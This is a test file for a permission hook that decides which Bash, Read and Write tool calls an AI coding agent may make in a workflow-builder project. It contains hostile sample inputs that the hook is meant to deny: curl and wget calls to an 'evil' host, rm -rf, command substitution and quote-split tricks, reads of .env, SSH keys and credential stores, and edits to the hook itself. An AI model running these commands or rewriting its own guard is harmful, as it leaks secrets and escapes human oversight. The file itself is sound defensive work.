/**
 * Spec 015 D1 — the PreToolUse permission hook's pure decision core. This is the unit half of the
 * chain-closing acceptance (the end-to-end half is proven by a live `claude` turn against the
 * hook-wired headless-settings.json, recorded in the 015 ledger). It tables:
 *   • analyzeBashCommand — ALLOW the fixed phase scripts + read-only git/inspectors; DENY python -c/-e,
 *     bash -c, curl/rm/…, sync.py (backend-only), any shell metacharacter, and the default-deny tail.
 *   • checkForbiddenPath — hard-deny Read of .env, Write to .venv/.env/.claude/tools/skills/sibling-.runs,
 *     and a Bash command that REFERENCES .env (the python/cat exfil vector).
 *   • decide — the dispatcher: forbidden-paths first, Bash default-deny, in-project Write allow,
 *     read-only tools allow, unknown tool abstain.
 */
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
import {
  analyzeBashCommand,
  checkForbiddenPath,
  decide,
  ALLOWED_PYTHON_SCRIPTS,
} from '../server/hooks/permission-gate.js';

const TASK = '1700000000001';
const bash = (command: string) => decide({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command } }, TASK).decision;

describe('analyzeBashCommand — allow the fixed phase command set', () => {
  test('every enumerated .venv/bin/python <script> is allowed', () => {
    // The exact forms the 4 phase .md run (Q2). generate_id takes a count; the linters take a path.
    assert.equal(analyzeBashCommand('.venv/bin/python skills/mango-svip/scripts/generate_id.py 5').decision, 'allow');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/find.py --json --has llm --has if_else').decision, 'allow');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/find.py --list-features').decision, 'allow');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/validate_workflow.py projects/wf_x/workflows/main.yml').decision, 'allow');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/lint_refs.py projects/wf_x/workflows/main.yml').decision, 'allow');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/lint_plugin_hashes.py projects/wf_x/workflows/main.yaml').decision, 'allow');
  });

  test('an absolute path to the venv python is also recognized', () => {
    assert.equal(analyzeBashCommand('/repo/.venv/bin/python tools/dify_base/lint_refs.py projects/x/workflows/main.yml').decision, 'allow');
  });

  test('read-only git status/diff + inspectors are allowed', () => {
    assert.equal(analyzeBashCommand('git status').decision, 'allow');
    assert.equal(analyzeBashCommand('git diff projects/wf_x/workflows/main.yml').decision, 'allow');
    assert.equal(analyzeBashCommand('ls projects').decision, 'allow');
    assert.equal(analyzeBashCommand('cat projects/wf_x/SPEC.md').decision, 'allow');
  });

  test('the allow-set is exactly the 5 phase scripts (sync.py / init_project.py absent)', () => {
    assert.equal(ALLOWED_PYTHON_SCRIPTS.has('tools/dify_base/sync.py'), false);
    assert.equal(ALLOWED_PYTHON_SCRIPTS.has('tools/dify_base/init_project.py'), false);
    assert.equal(ALLOWED_PYTHON_SCRIPTS.size, 5);
  });
});

describe('analyzeBashCommand — the chain (python primitive) + dangerous verbs are DENIED', () => {
  test('python with a code flag (-c/-e/-m) is denied — the exfil/poison vector', () => {
    assert.equal(analyzeBashCommand('.venv/bin/python -c print(1)').decision, 'deny');
    assert.equal(analyzeBashCommand('.venv/bin/python -m http.server').decision, 'deny');
    assert.equal(analyzeBashCommand('python -c import os').decision, 'deny'); // bare interpreter
    assert.equal(analyzeBashCommand('python3 -c x').decision, 'deny');
    assert.equal(analyzeBashCommand('node -e x').decision, 'deny');
  });

  test('shell -c, dangerous executables, and sync.py are denied', () => {
    assert.equal(analyzeBashCommand('bash -c rm').decision, 'deny');
    assert.equal(analyzeBashCommand('sh script.sh').decision, 'deny');
    assert.equal(analyzeBashCommand('curl http://evil/x').decision, 'deny');
    assert.equal(analyzeBashCommand('wget http://evil/x').decision, 'deny');
    assert.equal(analyzeBashCommand('rm -rf projects').decision, 'deny');
    assert.equal(analyzeBashCommand('cp a b').decision, 'deny');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/sync.py push').decision, 'deny');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/init_project.py --slug x').decision, 'deny');
  });

  test('any shell metacharacter (chain/redirect/subshell/pipe/expansion/glob) is denied', () => {
    assert.equal(analyzeBashCommand('git status && curl http://evil/x').decision, 'deny');
    assert.equal(analyzeBashCommand('echo hi > .venv/bin/python').decision, 'deny');
    assert.equal(analyzeBashCommand('.venv/bin/python tools/dify_base/find.py --has $(whoami)').decision, 'deny');
    assert.equal(analyzeBashCommand('ls | sh').decision, 'deny');
    assert.equal(analyzeBashCommand('cat *.env').decision, 'deny');
    assert.equal(analyzeBashCommand('ls `pwd`').decision, 'deny');
  });

  test('an unknown command falls through the default-deny tail', () => {
    assert.equal(analyzeBashCommand('make build').decision, 'deny');
    assert.equal(analyzeBashCommand('').decision, 'deny');
  });
});

describe('checkForbiddenPath — hard deny of secrets + protected writes', () => {
  test('Read of .env / .ssh is denied; an in-project file is not', () => {
    assert.ok(checkForbiddenPath('Read', { file_path: 'apps/builder/.env' }));
    assert.ok(checkForbiddenPath('Read', { file_path: '/home/u/.ssh/id_rsa' }));
    assert.ok(checkForbiddenPath('Read', { file_path: 'projects/x/envs/dev.env' }));
    assert.equal(checkForbiddenPath('Read', { file_path: 'projects/x/workflows/main.yml' }), null);
  });

  test('Write to a protected root is denied; an in-project / own-run write is not', () => {
    assert.ok(checkForbiddenPath('Write', { file_path: '.venv/bin/python' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: 'apps/builder/.env' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: '.claude/settings.local.json' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: 'tools/dify_base/sync.py' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: 'skills/mango-svip/scripts/generate_id.py' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: '/home/u/.zshrc' }, TASK));
    // spec 040 D1: bare root files (INDEX.md), docs/, and templates/ are now defended SOLELY by this hook
    // (post-turn confinement no longer reverts out-of-projects/ dirt — it may be a concurrent edit). Lock it.
    assert.ok(checkForbiddenPath('Write', { file_path: 'INDEX.md' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: 'docs/specs/038-fp-report.md' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: 'templates/patterns/agent-with-tools.yml' }, TASK));
    assert.equal(checkForbiddenPath('Write', { file_path: 'projects/x/workflows/main.yml' }, TASK), null);
    assert.equal(checkForbiddenPath('Write', { file_path: `apps/builder/.runs/${TASK}/task.json` }, TASK), null);
    assert.equal(checkForbiddenPath('Write', { file_path: `.runs/${TASK}/analyze.json` }, TASK), null);
  });

  test('a SIBLING task run dir is denied; own task id is allowed (BUILDER_TASK_ID scope)', () => {
    assert.ok(checkForbiddenPath('Write', { file_path: 'apps/builder/.runs/9999999999999/task.json' }, TASK));
    assert.ok(checkForbiddenPath('Write', { file_path: '.runs/9999999999999/x' }, TASK));
    // No taskId in env → the sibling guard is skipped (the post-turn confinement backstop catches it).
    assert.equal(checkForbiddenPath('Write', { file_path: 'apps/builder/.runs/9999999999999/task.json' }), null);
  });

  test('a Bash command REFERENCING a secret is denied, but the venv python prefix is not', () => {
    assert.ok(checkForbiddenPath('Bash', { command: 'cat apps/builder/.env' }));
    assert.ok(checkForbiddenPath('Bash', { command: ".venv/bin/python -c open('apps/builder/.env')" }));
    // `.venv/bin/python` does NOT contain the substring `.env` → not a false positive.
    assert.equal(checkForbiddenPath('Bash', { command: '.venv/bin/python tools/dify_base/lint_refs.py projects/x/workflows/main.yml' }), null);
  });

  test('Glob/Grep targeting a sensitive path/pattern is denied', () => {
    assert.ok(checkForbiddenPath('Glob', { pattern: '**/.ssh/id_rsa' }));
    assert.ok(checkForbiddenPath('Grep', { pattern: 'TOKEN', path: 'apps/builder/.env' }));
  });
});

describe('decide — dispatcher behavior', () => {
  test('forbidden-path Bash beats the allow-set (referencing .env denied even if shaped like a script)', () => {
    assert.equal(bash('cat apps/builder/.env'), 'deny');
  });
  test('in-project Write allowed; read-only tools allowed; unknown tool abstains', () => {
    assert.equal(decide({ tool_name: 'Write', tool_input: { file_path: 'projects/x/workflows/main.yml' } }, TASK).decision, 'allow');
    assert.equal(decide({ tool_name: 'Read', tool_input: { file_path: 'projects/x/SPEC.md' } }, TASK).decision, 'allow');
    assert.equal(decide({ tool_name: 'TodoWrite', tool_input: {} }, TASK).decision, 'allow');
    assert.equal(decide({ tool_name: 'SomeFutureTool', tool_input: {} }, TASK).decision, 'abstain');
  });
  test('a non-PreToolUse event abstains', () => {
    assert.equal(decide({ hook_event_name: 'PostToolUse', tool_name: 'Bash', tool_input: { command: 'rm -rf /' } }, TASK).decision, 'abstain');
  });
});

// ─── spec 033 D3 layer 1: BUILDER_ASK_MODE denies EVERY write-class tool (the primary containment) ───
// This is the load-bearing safety layer for AC#4 — and it was previously untested at the pure-decision
// level (the ask.ts 1b/1c tests inject a fake runTurn, bypassing the hook entirely). Without these, a
// future refactor that reorders decide()'s branches, drops the askMode branch, or narrows WRITE_TOOLS
// would pass every other test while silently disabling the whole containment.
describe('spec 033 — decide(askMode=true) denies all write-class tools; askMode=false is unchanged', () => {
  const WRITE_CASES: Array<{ tool: string; input: Record<string, unknown> }> = [
    { tool: 'Write', input: { file_path: 'projects/x/workflows/main.yml' } },
    { tool: 'Edit', input: { file_path: 'projects/x/SPEC.md' } },
    { tool: 'MultiEdit', input: { file_path: `apps/builder/.runs/${TASK}/SPEC.md` } },
    { tool: 'NotebookEdit', input: { notebook_path: `.runs/${TASK}/x.ipynb` } },
  ];

  test('every write-class tool that would NORMALLY be an in-project allow is DENIED under askMode', () => {
    for (const { tool, input } of WRITE_CASES) {
      // baseline: without askMode these are legit in-project writes → allow (proves the deny is askMode's doing)
      assert.equal(decide({ tool_name: tool, tool_input: input }, TASK, false).decision, 'allow', `${tool} allowed normally`);
      // askMode → deny, with the ask-mode reason
      const d = decide({ tool_name: tool, tool_input: input }, TASK, true);
      assert.equal(d.decision, 'deny', `${tool} denied under askMode`);
      assert.match(d.reason, /Ask mode/i);
    }
  });

  test('askMode denies a write even to a path a NORMAL turn could write (not just protected paths)', () => {
    // the deny is categorical (the tool), not path-based — a brand-new file in the build's own project.
    assert.equal(decide({ tool_name: 'Write', tool_input: { file_path: 'projects/x/notes.md' } }, TASK, true).decision, 'deny');
  });

  test('askMode does NOT broaden the deny to read-only tools or Bash (still allow/analyze as usual)', () => {
    assert.equal(decide({ tool_name: 'Read', tool_input: { file_path: 'projects/x/SPEC.md' } }, TASK, true).decision, 'allow');
    assert.equal(decide({ tool_name: 'Grep', tool_input: { pattern: 'foo' } }, TASK, true).decision, 'allow');
    // an allowed phase script still allowed; a forbidden Bash still denied — askMode is orthogonal to Bash.
    assert.equal(decide({ tool_name: 'Bash', tool_input: { command: 'git status' } }, TASK, true).decision, 'allow');
    assert.equal(decide({ tool_name: 'Bash', tool_input: { command: 'rm -rf projects' } }, TASK, true).decision, 'deny');
  });

  test('a forbidden-path write is denied under askMode too (forbidden-paths still runs first)', () => {
    assert.equal(decide({ tool_name: 'Write', tool_input: { file_path: '.venv/bin/python' } }, TASK, true).decision, 'deny');
  });
});

// The live-binary half: prove main() actually READS BUILDER_ASK_MODE from the env and wires it into
// decide() — a pure-function test can't catch a future main() that forgets to pass askMode through.
describe('spec 033 — live hook binary honors BUILDER_ASK_MODE=1', () => {
  const hookPath = fileURLToPath(new URL('../server/hooks/permission-gate.ts', import.meta.url));
  const fire = (payload: unknown, askMode: boolean): string | undefined => {
    const env: NodeJS.ProcessEnv = { ...process.env, BUILDER_TASK_ID: TASK };
    if (askMode) env.BUILDER_ASK_MODE = '1';
    else delete env.BUILDER_ASK_MODE;
    const out = execFileSync('node', ['--disable-warning=ExperimentalWarning', hookPath], {
      input: JSON.stringify(payload),
      encoding: 'utf8',
      env,
    });
    const j = out.trim() ? (JSON.parse(out) as { hookSpecificOutput?: { permissionDecision?: string } }) : {};
    return j.hookSpecificOutput?.permissionDecision;
  };
  const write = { hook_event_name: 'PreToolUse', tool_name: 'Write', tool_input: { file_path: 'projects/x/workflows/main.yml' } };
  test('an in-project Write is ALLOWED without the env, DENIED with BUILDER_ASK_MODE=1', () => {
    assert.equal(fire(write, false), 'allow');
    assert.equal(fire(write, true), 'deny');
  });
});

// ─── Red-team review fixes (spec 015) ────────────────────────────────────────────────────────────
describe('review C1 — `git diff`/`status` flags are NOT all read-only', () => {
  test('git diff --output=<path> (an arbitrary-file WRITE) is denied', () => {
    assert.equal(analyzeBashCommand('git diff --output=.venv/bin/python').decision, 'deny');
    assert.equal(bash('git diff --output=apps/builder/server/hooks/permission-gate.ts'), 'deny');
  });
  test('git diff --no-index <a> <b> (an arbitrary-file READ) is denied', () => {
    assert.equal(analyzeBashCommand('git diff --no-index a b').decision, 'deny');
    assert.equal(analyzeBashCommand('git diff --git-dir=/tmp/x diff').decision, 'deny');
  });
  test('genuinely read-only git flags still pass', () => {
    assert.equal(analyzeBashCommand('git status --porcelain').decision, 'allow');
    assert.equal(analyzeBashCommand('git status --porcelain --branch').decision, 'allow');
    assert.equal(analyzeBashCommand('git diff --stat').decision, 'allow');
    assert.equal(analyzeBashCommand('git diff --name-only HEAD').decision, 'allow');
  });
});

describe('review C2 — quote-split cannot smuggle a secret read', () => {
  test("cat apps/builder/.e''nv (quote-split the .env literal) is denied (quotes are a metacharacter now)", () => {
    assert.equal(bash("cat apps/builder/.e''nv"), 'deny');
    assert.equal(bash('head apps/builder/.e""nv'), 'deny');
  });
  test('a legit workflow file named *.env.yml is NOT a false-positive', () => {
    assert.equal(bash('.venv/bin/python tools/dify_base/lint_refs.py projects/x/workflows/config.env.yml'), 'allow');
    assert.equal(checkForbiddenPath('Read', { file_path: 'projects/x/workflows/config.env.yml' }, TASK), null);
  });
});

describe('review H1 — fail CLOSED on a malformed payload', () => {
  test('JSON null / a non-object input denies (would otherwise throw → fail open)', () => {
    assert.equal(decide(null as unknown as { tool_name?: string }, TASK).decision, 'deny');
    assert.equal(decide(42 as unknown as { tool_name?: string }, TASK).decision, 'deny');
  });
});

describe('review H2 — MultiEdit/NotebookEdit go through the protected-write guard', () => {
  test('MultiEdit/NotebookEdit to a protected path is denied (the .venv-poison edit channel)', () => {
    assert.equal(decide({ tool_name: 'MultiEdit', tool_input: { file_path: '.venv/bin/python' } }, TASK).decision, 'deny');
    assert.equal(decide({ tool_name: 'NotebookEdit', tool_input: { notebook_path: '.venv/poison.ipynb' } }, TASK).decision, 'deny');
    assert.equal(decide({ tool_name: 'MultiEdit', tool_input: { file_path: 'tools/dify_base/lint_refs.py' } }, TASK).decision, 'deny');
  });
  test('MultiEdit to an in-project path is allowed', () => {
    assert.equal(decide({ tool_name: 'MultiEdit', tool_input: { file_path: 'projects/x/workflows/main.yml' } }, TASK).decision, 'allow');
  });
});

// The load-bearing regression guard (review MEDIUM): the unit tests above call the pure functions, but
// a wrong emit() wire shape or a `.ts`-via-node breakage would pass them while FAILING OPEN in reality.
// This spawns the ACTUAL hook binary the way Claude Code does and asserts the wire contract end-to-end.
describe('review — live hook binary (wire contract, not just the pure functions)', () => {
  const hookPath = fileURLToPath(new URL('../server/hooks/permission-gate.ts', import.meta.url));
  const fire = (payload: unknown): string | undefined => {
    const out = execFileSync('node', ['--disable-warning=ExperimentalWarning', hookPath], {
      input: typeof payload === 'string' ? payload : JSON.stringify(payload),
      encoding: 'utf8',
      env: { ...process.env, BUILDER_TASK_ID: TASK },
    });
    const j = out.trim() ? (JSON.parse(out) as { hookSpecificOutput?: { permissionDecision?: string } }) : {};
    return j.hookSpecificOutput?.permissionDecision;
  };
  test('a deny payload emits the deny wire shape; a legit one allows', () => {
    assert.equal(fire({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: 'git diff --output=.venv/bin/python' } }), 'deny');
    assert.equal(fire({ hook_event_name: 'PreToolUse', tool_name: 'Bash', tool_input: { command: '.venv/bin/python tools/dify_base/lint_refs.py projects/x/workflows/main.yml' } }), 'allow');
  });
  test('a malformed payload FAILS CLOSED at the binary (the H1 fail-open guard)', () => {
    assert.equal(fire('null'), 'deny');
  });
});

describe('review H3 — path normalization + a broader secret set', () => {
  test('trailing slash cannot dodge the sensitive-read guard', () => {
    assert.equal(decide({ tool_name: 'Read', tool_input: { file_path: 'apps/builder/.env/' } }, TASK).decision, 'deny');
  });
  test('other credential stores (.netrc/.npmrc/.docker/.kube) are denied', () => {
    assert.equal(decide({ tool_name: 'Read', tool_input: { file_path: '/Users/me/.netrc' } }, TASK).decision, 'deny');
    assert.equal(decide({ tool_name: 'Read', tool_input: { file_path: '/Users/me/.docker/config.json' } }, TASK).decision, 'deny');
    assert.equal(decide({ tool_name: 'Read', tool_input: { file_path: '/Users/me/id_ed25519' } }, TASK).decision, 'deny');
  });
  test('dot-dot escape cannot clobber a SIBLING task run dir; the OWN task dir stays writable', () => {
    assert.equal(decide({ tool_name: 'Write', tool_input: { file_path: `apps/builder/.runs/${TASK}/../1700000000002/task.json` } }, TASK).decision, 'deny');
    assert.equal(decide({ tool_name: 'Write', tool_input: { file_path: `apps/builder/.runs/${TASK}/analyze.json` } }, TASK).decision, 'allow');
  });
});

// ─── spec 018: write-allowlist (a turn cannot modify the app's own code / its own hook) ───────────
describe('spec 018 — write-allowlist: the turn cannot neuter its own guard', () => {
  const w = (file_path: string, tool = 'Write'): string =>
    decide({ tool_name: tool, tool_input: { file_path } }, TASK).decision;
  test('writing the hook / orchestrator / settings / any apps/builder source → DENIED', () => {
    assert.equal(w('apps/builder/server/hooks/permission-gate.ts'), 'deny'); // the self-modify master key
    assert.equal(w('apps/builder/server/lib/orchestrator.ts', 'Edit'), 'deny');
    assert.equal(w('apps/builder/headless-settings.json'), 'deny');
    assert.equal(w('apps/builder/web/src/store.ts', 'MultiEdit'), 'deny');
  });
  test('writing scripts / .github / a root file → DENIED', () => {
    assert.equal(w('scripts/setup.sh'), 'deny');
    assert.equal(w('.github/workflows/ci.yml'), 'deny');
    assert.equal(w('Makefile'), 'deny');
    assert.equal(w('package.json'), 'deny');
  });
  test('legit build writes still ALLOWED (projects + own run dir + .vscode)', () => {
    assert.equal(w('projects/wf_x/workflows/main.yml'), 'allow');
    assert.equal(w('projects/wf_x/SPEC.md'), 'allow');
    assert.equal(w(`.runs/${TASK}/analyze.json`), 'allow');
    assert.equal(w(`apps/builder/.runs/${TASK}/SPEC.md`), 'allow');
    assert.equal(w('.vscode/settings.json'), 'allow');
  });
  test('traversal out of the allowed roots → DENIED', () => {
    assert.equal(w('projects/x/../../apps/builder/server/hooks/permission-gate.ts'), 'deny');
    assert.equal(w(`.runs/${TASK}/../../apps/builder/server/lib/orchestrator.ts`), 'deny');
  });
  test('an absolute path outside the repo → DENIED', () => {
    assert.equal(w('/etc/cron.d/evil'), 'deny');
    assert.equal(w('/Users/me/.bashrc'), 'deny');
  });
});
